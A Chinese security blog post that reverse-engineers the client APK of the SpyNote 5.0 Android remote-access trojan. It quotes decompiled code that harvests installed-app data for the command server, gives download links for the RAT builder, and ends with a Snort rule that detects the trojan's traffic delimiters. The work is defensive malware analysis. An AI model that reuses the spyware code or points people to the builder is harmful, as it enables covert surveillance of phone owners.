原创： 柠檬菠萝 合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

1\. SpyNote5.0 是什么?

SpyNote是用来创建Android恶意程序的工具。它的功能引人注目，读取联系人、录音、命令执行、应用管理、键盘记录、GPS定位等等。这些功能对于研究安Android端恶意程序起到承上启下的作用。咱们能够通过一系列文章对于它的使用初步了解，《SpyNote
V5.0图形化工具远程管理Android手机教程》、《小心，Android木马工具SpyNote免费啦！远程监听就是这么简单》、《当心，安卓远控（spynote）升级了……》等等。

2\. 准备工具

对于SpyNote5.0 Client_APK的逆向分析却鲜有人问津，下面我简单介绍使用工具，然后开始进入逆向分析环节。

1、SpyNote5.0

下载地址：https://github.com/soDLL/SpyNote OR https://github.com/miladzero/SpyNote

![v2-b754609b9fcfeb44d332c8c34d6b2e42_hd.j](https://pic2.zhimg.com/80/v2-b754609b9fcfeb44d332c8c34d6b2e42_hd.jpg)

2、jadx-gui

下载地址: https://github.com/skylot/jadx/releases

![v2-60776c41fcd022f410682ac571c3c3f3_hd.j](https://pic3.zhimg.com/80/v2-60776c41fcd022f410682ac571c3c3f3_hd.jpg)

3、androidkiller

下载地址: https://www.guguzhu.com/soft/270509.html

![v2-270dc84615ef8856ee713b0854482987_hd.j](https://pic1.zhimg.com/80/v2-270dc84615ef8856ee713b0854482987_hd.jpg)

3\. 开始逆向分析

咱们开始对于Client_APK进行分析，通常喜欢将客户端生成的APK程序拖入androidkiller。（如何生成客户端请见上文的几篇文章）
拖入程序后androidkiller会自动进行反汇编，然后有程序分析结果。

![v2-8ea6df4be9ba561c66ab0854c6aba4fd_hd.j](https://pic2.zhimg.com/80/v2-8ea6df4be9ba561c66ab0854c6aba4fd_hd.jpg)

在左侧按照继承关系分类Activity、Receiver、Service和应用权限(Uses-Permisson),能够看到客户端需要的应用权限很多。右侧则是smail汇编窗口和工作台。通过这个工具能清楚看到权限以及各类继承关系，但是工具版本比较低，代码还原的不完善。我将工具换成jadx-gui，然后继续开始逆向分析，将Client_APK导入。

![v2-18785b7937556d27ce15ba7dcc5b0d9d_hd.j](https://pic4.zhimg.com/80/v2-18785b7937556d27ce15ba7dcc5b0d9d_hd.jpg)

咱们能看到三个包，分别是android.support，con.eset.ems2.gp，yps.eton.application。其中android.support为安卓本支持包其中包括低版本、v4、v7，con.eset.ems2.gp为配置包里面包含了host、client_name等信息，yps.eton.application则是咱们需要分析的。

打开yps.eton.application，咱们能看到14个类,由于需要分析的代码比较多，所以有针对性的对于部分关键代码进行分析。

![v2-10bf759688332aa4bc07ab54ac8f6f74_hd.j](https://pic4.zhimg.com/80/v2-10bf759688332aa4bc07ab54ac8f6f74_hd.jpg)

通过之前androidkiller分析结构能够看到,A、F、G、k 这个写类继承了Service，Service
在安卓系统中代表后台持续运行。咱们不妨猜下，Client_APK中需要持续运行的可能会有什么？也许是关键对象会持续运行、受控、监听、多线程等等。咱们本次分析的重点是它部分功能以及如何识别流量。

3.1命令执行启动分析

咱们从A方法开始,A方法开始启动服务，遍历了R对象，取第三个元素，如果他等于1则执行j()。否则在判断a()是否已经被实例化后启动服务。在之后会继续判断j()是否具备root权限。

![v2-ddb49278cf37021e7eb0207d627dba20_hd.j](https://pic2.zhimg.com/80/v2-ddb49278cf37021e7eb0207d627dba20_hd.jpg)

继续看j()，j()中使用执行su命令后，将Do I have
root?写入文件/system/sd/temporary.txt，对于是否为root权限进行了判断。

![v2-ca7dfae391455afa9ca79a8f51cf773a_hd.j](https://pic4.zhimg.com/80/v2-ca7dfae391455afa9ca79a8f51cf773a_hd.jpg)

接着看h()，之中使用了多线程，获取R对象中的存储的配置参数，采用循环和socket回传信息。

![v2-e40f3b82244d02304e8f7cb08d6c07d1_hd.j](https://pic1.zhimg.com/80/v2-e40f3b82244d02304e8f7cb08d6c07d1_hd.jpg)

3.2 Base64编码应用部分功能分析

在查看A对象的导入列表时候发现之中包含android.util.Base64,说明在运行之中使用了base64编码。紧接着搜索关键字Base64，能够看到Base64包裹着((BitmapDrawable)
applicationIcon).getBitmap()，其实内部就是应用图标。客户端将一些信息通过c0c1c3a2c0c1c分割以9xf89fff9xf89结尾进行传递，对于异常信息和选项采用fxf0x4x4x0fxf分割传递。

public void k() { new Thread(new Runnable() { public void run() { String str;
try { StringBuffer stringBuffer = new StringBuffer(); PackageManager
packageManager = A.this.getApplicationContext().getPackageManager(); for
(ApplicationInfo applicationInfo :
packageManager.getInstalledApplications(128)) { if
(packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null
&&
!packageManager.getLaunchIntentForPackage(applicationInfo.packageName).equals(""))
{ try { Date date = new
Date(packageManager.getPackageInfo(applicationInfo.packageName,
4096).firstInstallTime); String str2 =
packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null
? (applicationInfo.flags & 1) == 1 ? "system" : "user" : ""; Drawable
applicationIcon =
packageManager.getApplicationIcon(applicationInfo.packageName); String str3 =
new String(); if (applicationIcon != null) { Bitmap bitmap = ((BitmapDrawable)
applicationIcon).getBitmap(); ByteArrayOutputStream byteArrayOutputStream =
new ByteArrayOutputStream(); bitmap.compress(CompressFormat.JPEG, 50,
byteArrayOutputStream); str =
Base64.encodeToString(byteArrayOutputStream.toByteArray(), 2); } else { str =
str3; }
stringBuffer.append(packageManager.getApplicationLabel(applicationInfo) +
"c0c1c3a2c0c1c" + applicationInfo.packageName + "c0c1c3a2c0c1c" + str +
"c0c1c3a2c0c1c" + str2 + "c0c1c3a2c0c1c" + date.toString() + "c0c1c3a2c0c1c" +
A.this.getPackageName() + "9xf89fff9xf89"); } catch (NameNotFoundException e)
{ A.this.h("applicationsfxf0x4x4x0fxf[My/Exception]" +
e.getMessage().toString()); } } } A.this.h("applicationsfxf0x4x4x0fxf" +
stringBuffer.toString()); } catch (Exception e2) {
A.this.h("applicationsfxf0x4x4x0fxf[My/Exception]" +
e2.getMessage().toString()); } } }).start(); }

3.3 信息获取部分功能分析

b方法是A对象中最长的方法，里面包含着switch
case语句分支太多导致反汇编异常。观察注释不难看出，里面实现了大多数的获取信息的逻辑。例如：Device info、System info、Sim
info、WIFI info等等，包含了工具所宣传的功能。

![v2-a3ab5f1d4f66ad8d632f219081b9045a_hd.j](https://pic1.zhimg.com/80/v2-a3ab5f1d4f66ad8d632f219081b9045a_hd.jpg)

在b方法的重写里面有些地方值得注意，这里用于获取存储路径。传输路径信息的分隔符使用e1x1114x61114e。文件名信息分隔符使用-1c0c1c3a2c0c1c-1c0c1c3a2c0c1c-1c0c1c3a2c0c1c。通过这些信息能够较为准确的判断客户端传递时的操作。

![v2-cd8dca332a90958e59e37e7ce59db60d_hd.j](https://pic4.zhimg.com/80/v2-cd8dca332a90958e59e37e7ce59db60d_hd.jpg)

4\. 总结

在分析过程中能够看到各个功能的实现。Client使用了未加密和Base编码传输，传输过程中最明显的是分割符号。通过程序能够有效地判断，Client的传输行为。于是对于传输过程进行抓包。

![v2-5fa2d4a523ed1691883ce3e786ff87b3_hd.j](https://pic4.zhimg.com/80/v2-5fa2d4a523ed1691883ce3e786ff87b3_hd.jpg)

图中明显看到分隔符号和base64编码内容。对于这点咱们可以在Snort中编写规则进行识别，识别示例：

alert tcp any any -> any any (content:"fxf0x4x4x0fxf"; sid:1; msg:SpyNote5.0
Client;)

AndroidAPK逆向分析：

[实验:AndroidAPK逆向分析(合天网安实验室)](http://www.hetianlab.com/expc.do?ec=ECID172.19.104.182014053009520900001)  

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

